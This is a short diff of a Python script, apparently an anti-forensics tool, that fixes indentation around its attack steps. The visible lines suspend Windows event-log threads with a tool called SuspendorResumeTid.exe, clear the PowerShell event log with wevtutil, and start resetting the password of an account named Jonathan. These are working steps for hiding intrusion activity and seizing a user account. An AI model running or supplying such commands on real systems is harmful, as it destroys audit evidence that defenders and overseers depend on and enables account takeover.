@@ -44,8 +44,8 @@ cmd = "C:\Tools\Eventlogedit-evtx\SuspendorResumeTid.exe suspend"
 subprocess.call(cmd)
 
 # Delete Windows Event Logging - PowerShell Logs
-    cmd = 'wevtutil.exe cl "Windows PowerShell"'
-    subprocess.call(cmd)
+cmd = 'wevtutil.exe cl "Windows PowerShell"'
+subprocess.call(cmd)
 
 # Set random password
 u = "Jonathan"
